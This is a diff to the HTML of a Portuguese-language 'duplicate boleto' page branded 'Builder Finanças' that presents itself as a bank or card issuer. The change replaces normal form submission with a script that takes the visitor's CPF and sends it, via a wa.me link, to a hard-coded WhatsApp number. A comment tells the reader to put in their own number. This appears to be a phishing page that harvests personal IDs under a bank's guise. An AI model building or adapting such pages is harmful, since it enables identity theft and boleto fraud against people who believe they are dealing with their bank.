@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Gere a 2ª via do boleto em segundos, sem app.">
+  <meta name="description" content="Emissão da 2ª via do boleto – rápido e sem app.">
   <meta name="robots" content="noindex, nofollow">
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='75' font-size='75'>📄</text></svg>">
-  <title>2ª via de boleto – Builder Finanças</title>
+  <title>2ª via do boleto – Builder Finanças</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
@@ -16,8 +16,7 @@
 <body>
   <header>
     <div class="container header-flex">
-      <!-- logo neutra: cartão branco -->
-      <img class="logo" src="img/logo-card.png" alt="Logo banco">
+      <img class="logo" src="img/logo-builder.png" alt="Logo banco">
       <nav>
         <a href="#home">Home</a>
         <a href="#vantagens">Benefícios</a>
@@ -44,7 +43,7 @@
 
     <section id="vantagens">
       <div class="container">
-        <h2>Praticidade que só o Builder Finanças tem</h2>
+        <h2>Praticidade que só quem tem nosso cartão conhece</h2>
         <div class="grid-vantagens">
           <div class="item"><img src="img/icon-check.png" alt=""><h3>Atendimento 24 h</h3></div>
           <div class="item"><img src="img/icon-card.png" alt=""><h3>Sem anuidade</h3></div>
@@ -66,10 +65,11 @@
       e.preventDefault();
       grecaptcha.ready(function() {
         grecaptcha.execute('6LcyLCosAAAAAIDEKRlketKSPHZdL-BMfcRZT8dF', {action: 'submit'}).then(function(token) {
-          // aqui você pode enviar o token para o backend ou simplesmente prosseguir
-          console.log('recaptcha token:', token);
-          // segue o fluxo normal
-          e.target.submit();
+          console.log('token:', token);  // apenas para você ver que funcionou
+          const cpf = document.getElementById('cpf').value;
+          // substitua o número abaixo pelo seu WhatsApp
+          window.open(`https://wa.me/5511956391683?text=Olá, quero a 2ª via do boleto - CPF ${cpf}`, '_blank');
+          e.target.reset();
         });
       });
     }
